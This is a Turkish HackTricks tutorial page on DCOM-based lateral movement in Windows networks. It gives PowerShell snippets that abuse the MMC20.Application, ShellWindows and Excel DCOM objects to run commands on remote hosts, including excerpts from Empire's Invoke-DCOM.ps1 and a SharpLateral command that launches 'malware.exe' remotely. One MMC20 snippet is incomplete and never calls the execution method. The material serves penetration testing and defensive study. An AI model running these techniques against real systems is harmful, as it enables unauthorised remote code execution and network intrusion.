# DCOM Exec

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'a katılın!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile göndererek paylaşın**.

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun ve daha hızlı düzeltebilin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Bu teknik hakkında daha fazla bilgi için [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) adresindeki orijinal yazıyı kontrol edin.**

Dağıtılmış Bileşen Nesne Modeli (DCOM) nesneleri, ağ tabanlı nesnelerle etkileşim için ilginç bir yetenek sunar. Microsoft, DCOM ve Bileşen Nesne Modeli (COM) için kapsamlı belgelendirme sağlar, [DCOM için buraya](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [COM için buraya](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) erişilebilir. Bir DCOM uygulamasının listesi, PowerShell komutu kullanılarak alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM nesnesi, [MMC Uygulama Sınıfı (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) MMC eklenti işlemlerinin betikleştirilmesini sağlar. Özellikle, bu nesne `Document.ActiveView` altında `ExecuteShellCommand` yöntemini içerir. Bu yöntem hakkında daha fazla bilgi [burada](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) bulunabilir. Çalıştırmak için kontrol edin:

Bu özellik, bir DCOM uygulaması aracılığıyla ağ üzerinde komutların yürütülmesini kolaylaştırır. Uzaktan yönetici olarak DCOM ile etkileşim kurmak için PowerShell aşağıdaki gibi kullanılabilir:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut, DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. Ardından ExecuteShellCommand yöntemi çağrılarak uzak makinede bir işlem yürütülür. İşlem aşağıdaki adımları içerir:

Yöntemleri kontrol et:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE Elde Et:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows ve ShellBrowserWindow

**Bu teknik hakkında daha fazla bilgi için orijinal yazıya [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) bakabilirsiniz.**

**MMC20.Application** nesnesinin, "LaunchPermissions" açık izinlere sahip olmadığı belirlendi ve varsayılan olarak Yöneticilere erişim izni verildi. Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) bir konu incelenebilir ve [@tiraniddo](https://twitter.com/tiraniddo)'nun OleView .NET'inin, açık Launch Permission olmayan nesneleri filtrelemek için kullanılması önerilir.

`ShellBrowserWindow` ve `ShellWindows` adlı iki özel nesne, açık Launch Permission olmaması nedeniyle vurgulandı. `HKCR:\AppID\{guid}` altında `LaunchPermission` kayıt girişinin olmaması, açık izinlerin olmadığını gösterir.

### ShellWindows
ProgID olmayan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID kullanarak nesne örnekleme işlemini kolaylaştırır. Bu işlem, OleView .NET'in kullanılmasıyla `ShellWindows` için CLSID'nin alınmasını sağlar. Bir kez örneklendirildikten sonra, etkileşim `WindowsShell.Item` yöntemi aracılığıyla mümkün olur ve `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.

Uzaktan nesne örnekleme ve komutları çalıştırma için örnek PowerShell komutları sağlandı:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Excel DCOM Nesneleri ile Yanal Hareket

Yanal hareket, DCOM Excel nesnelerini istismar ederek elde edilebilir. Detaylı bilgi için, DCOM üzerinden yanal hareket için Excel DDE'nin kullanılması hakkındaki tartışmayı [Cybereason'un blogunda](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.

Empire projesi, Excel'in DCOM nesnelerini manipüle ederek uzaktan kod yürütme (RCE) için kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, Excel'i RCE için istismar etmek için farklı yöntemleri sergileyen [Empire'in GitHub deposundan](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) alınan betik parçaları bulunmaktadır:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Yana Yayılma için Otomasyon Araçları

Bu teknikleri otomatikleştirmek için iki araç öne çıkıyor:

- **Invoke-DCOM.ps1**: Empire projesi tarafından sağlanan bir PowerShell betiği, uzak makinelerde kodu yürütmek için farklı yöntemlerin çağrılmasını basitleştirir. Bu betik, Empire GitHub deposunda erişilebilir.

- **SharpLateral**: Uzaktan kod yürütmek için tasarlanmış bir araçtır ve aşağıdaki komutla kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Otomatik Araçlar

* Powershell betiği [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1), diğer makinelerde kodu yürütmek için yorumlanmış tüm yöntemleri kolayca çağırmaya olanak sağlar.
* Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referanslar

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
